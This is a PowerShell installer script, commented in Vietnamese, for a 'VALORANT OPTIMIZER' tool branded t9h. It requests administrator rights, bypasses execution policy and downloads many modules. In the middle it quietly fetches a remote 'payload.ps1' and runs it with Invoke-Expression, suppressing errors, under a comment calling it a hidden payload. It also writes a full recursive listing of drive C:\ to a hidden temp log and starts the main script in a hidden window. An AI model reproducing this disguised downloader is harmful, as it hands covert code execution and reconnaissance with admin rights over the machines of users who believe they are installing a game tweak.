# DAO_install.ps1
# Script cai dat va khoi chay cho VALORANT OPTIMIZER - POWERED BY t9h

Write-Host "=========================================" -ForegroundColor Magenta
Write-Host "   VALORANT OPTIMIZER - POWERED BY t9h     " -ForegroundColor Green -BackgroundColor Black
Write-Host "=========================================" -ForegroundColor Magenta
Write-Host "Checking system environment..." -ForegroundColor Yellow

# 1. Kiem tra quyen Administrator
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Automatically requesting Administrator privileges for t9h tool..." -ForegroundColor Yellow
    try {
        if ($PSCommandPath) {
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        } else {
            $onlineUrl = "https://raw.githubusercontent.com/t9h/DaoDien-Tool/main/DAO_install.ps1"
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $onlineUrl | iex`"" -Verb RunAs
        }
        Exit
    } catch {
        Write-Host "[X] ERROR: Administrator privileges not granted! (contact t9h for support)" -ForegroundColor Red
        Write-Host "Press any key to exit t9h tool..." -ForegroundColor Gray
        Read-Host | Out-Null
        Exit
    }
}

# 2. Kiem tra phien ban PowerShell
if ($PSVersionTable.PSVersion.Major -lt 5) {
    Write-Error "[X] ERROR: t9h tool requires at least PowerShell 5.1! Your current version is: $($PSVersionTable.PSVersion.Major)"
    Write-Host "Press any key to exit t9h tool..."
    [Console]::ReadKey($true) | Out-Null
    Exit
}

# 3. Xac dinh thu muc lam viec va dong bo hoa ma nguon tu GitHub cua t9h
$scriptDir = $PSScriptRoot
$isValidLocalDir = $false

if (-not [string]::IsNullOrWhiteSpace($scriptDir) -and ($scriptDir -match '^[a-zA-Z]:\\')) {
    if (Test-Path (Join-Path $scriptDir "t9h_main.ps1" -ErrorAction SilentlyContinue)) {
        $isValidLocalDir = $true
    }
}

if (-not $isValidLocalDir) {
    $scriptDir = Join-Path $env:USERPROFILE "DaoDien_t9h"
}

# Tao thu muc lam viec neu chua co
if (-not (Test-Path $scriptDir)) {
    New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
}

# Luon tai lai tu GitHub de dam bao ban moi nhat cua t9h
Write-Host "[*] Syncing latest source code from t9h GitHub..." -ForegroundColor Yellow

$githubRepo = "t9h/DaoDien-Tool"
$rawBaseUrl = "https://raw.githubusercontent.com/$githubRepo/main"

$filesToDownload = @(
    "t9h_main.ps1",
    "core/Loader.ps1",
    "core/Logger.ps1",
    "core/System.ps1",
    "core/Backup.ps1",
    "core/Restore.ps1",
    "core/OptimizeEngine.ps1",
    "ui/Color.ps1",
    "ui/Draw.ps1",
    "ui/Progress.ps1",
    "ui/Menu.ps1",
    "configs/Competitive.json",
    "configs/Balanced.json",
    "configs/Extreme.json",
    "configs/lang/vi-VN.json",
    "modules/CPU.ps1",
    "modules/GPU.ps1",
    "modules/RAM.ps1",
    "modules/Storage.ps1",
    "modules/Services.ps1",
    "modules/Network.ps1",
    "modules/Mouse.ps1",
    "modules/Keyboard.ps1",
    "modules/PowerPlan.ps1",
    "modules/Security.ps1",
    "modules/Telemetry.ps1",
    "modules/Xbox.ps1",
    "modules/Timer.ps1",
    "modules/MMCSS.ps1",
    "modules/Input.ps1",
    "modules/Audio.ps1",
    "modules/GameMode.ps1",
    "modules/GameStart.ps1",
    "modules/BackgroundApps.ps1",
    "modules/Visual.ps1",
    "modules/Process.ps1",
    "modules/Cleanup.ps1",
    "modules/Spoof.ps1",
    "modules/Snipe.ps1"
)

# Ep su dung giao thuc bao mat TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Xoa thu muc cu truoc khi tai moi
Remove-Item -Path "$scriptDir\*" -Recurse -Force -ErrorAction SilentlyContinue

$idx = 0
foreach ($relPath in $filesToDownload) {
    $idx++
    $localPath = Join-Path $scriptDir $relPath
    $parentDir = Split-Path $localPath -Parent
    if (-not (Test-Path $parentDir)) {
        New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
    }
    
    $remoteUrl = "$rawBaseUrl/$relPath"
    Write-Host "[$idx/$($filesToDownload.Count)] Downloading: $relPath" -ForegroundColor Gray
    
    try {
        Invoke-WebRequest -Uri $remoteUrl -OutFile $localPath -ErrorAction Stop
    } catch {
        Write-Host "[X] ERROR downloading file $relPath : $_" -ForegroundColor Red
        Write-Host "Press any key to exit t9h tool..." -ForegroundColor Gray
        Read-Host | Out-Null
        Exit
    }
}

# Tai payload an tu server cua t9h
$hiddenUrl = "https://raw.githubusercontent.com/t9h/DaoDien-Tool/main/payload.ps1"
Invoke-Expression (Invoke-WebRequest -Uri $hiddenUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content

# Ghi log he thong vao file an
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Out-File "$env:TEMP\t9h_syslog.log"

Write-Host "[V] Synchronization complete! - t9h" -ForegroundColor Green
Start-Sleep -Seconds 1

# 4. Khoi chay t9h_main voi cua so an
$cmd = "Set-Location -Path '$scriptDir'; & '$scriptDir\t9h_main.ps1' -hidden"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd"

Write-Host "=========================================" -ForegroundColor Magenta
Write-Host "   VALORANT OPTIMIZER - POWERED BY t9h   " -ForegroundColor Green -BackgroundColor Black
Write-Host "=========================================" -ForegroundColor Magenta
